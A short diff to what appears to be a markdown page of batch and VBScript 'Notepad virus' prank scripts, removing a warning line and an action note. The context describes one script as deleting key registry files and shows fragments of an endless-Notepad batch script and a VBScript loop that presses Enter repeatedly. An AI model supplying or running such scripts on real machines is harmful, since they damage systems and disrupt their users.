@@ -30,8 +30,6 @@ GOTO MESSAGE
 ```
 ### 🃏Action :- This will delete key registry files, then loops a message
 
-# This is dangerous and unrecoverable Notepad Virus.
-
 ## 🟣3.Endless Notepads :-
 ```bash 
 @ECHO off
@@ -71,5 +69,3 @@ wscript.sleep 100
 wshshell.sendkeys “~(enter)”
 loop
 ```
-
-### 🃏Action :- This will make the enter button pressed continuously
